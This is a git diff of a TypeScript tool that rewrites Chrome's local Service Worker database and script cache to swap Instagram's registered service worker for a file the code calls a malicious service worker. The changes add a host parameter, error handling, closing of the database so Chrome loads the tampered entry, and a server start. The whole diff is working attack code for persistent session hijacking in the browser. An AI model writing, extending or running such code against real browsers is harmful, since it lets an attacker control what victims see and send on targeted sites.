@@ -1,16 +1,13 @@
 import { diskCache } from "./diskCache"
-import { getRegistrations, saveRegistrationEntries, setDbPath } from "./levelDb/serviceWorkerLevelDb"
+import { closeDb, getRegistrations, saveRegistrationEntries, setDbPath } from "./levelDb/serviceWorkerLevelDb"
 import * as fs from 'fs'
+import { server } from "./server"
 
-const chromeServiceWorkerDir = String.raw`C:\Users\maxmf\AppData\Local\Google\Chrome\User Data\Default\Service Worker`
-// Set up file paths
-diskCache.setFileBase(chromeServiceWorkerDir + String.raw`\ScriptCache`)
-setDbPath(chromeServiceWorkerDir + String.raw`\Database`)
 
-async function injectMaliciousServiceWorker() {
+async function injectMaliciousServiceWorker(host: string) {
     const basicMaliciousServiceWorker = fs.readFileSync("dist/serviceWorker/sw.js", "utf-8")
 
-    const registrations = await getRegistrations("https://www.instagram.com/")
+    const registrations = await getRegistrations(host)
     for(let registration of registrations) {
         const newScriptUrl = registration.registration.value.getScriptUrl()!.replace(/\/[^\/]+$/, "/invalid.js")
         registration.registration.value.setScriptUrl(newScriptUrl)
@@ -29,13 +26,31 @@ async function injectMaliciousServiceWorker() {
             serviceWorkerContent.body.value = basicMaliciousServiceWorker
             console.log(serviceWorkerContent.body.value)
             await serviceWorkerContent.save()
-            await diskCache.remove(diskCacheKey, diskCache.Streams.ServiceWorkerMetadata)
+            try {
+                await diskCache.remove(diskCacheKey, diskCache.Streams.ServiceWorkerMetadata)
+            } catch(e) {
+                console.log("Failed to remove service worker metadata file")
+            }
         }
 
         await saveRegistrationEntries(registration.registration, ...registration.resourceRecords)
     }
 }
-injectMaliciousServiceWorker()
+
+async function main() {
+    // Set up file paths
+    const chromeServiceWorkerDir = String.raw`C:\Users\maxmf\AppData\Local\Google\Chrome\User Data\Default\Service Worker`
+    diskCache.setFileBase(chromeServiceWorkerDir + String.raw`\ScriptCache`)
+    setDbPath(chromeServiceWorkerDir + String.raw`\Database`)
+    
+    await injectMaliciousServiceWorker("https://www.instagram.com/")
+    
+    // Close the levelDb instance so that chrome can use it
+    closeDb()
+    server.start() 
+}
+
+main()
 
 
 // async function testDiskCache() {
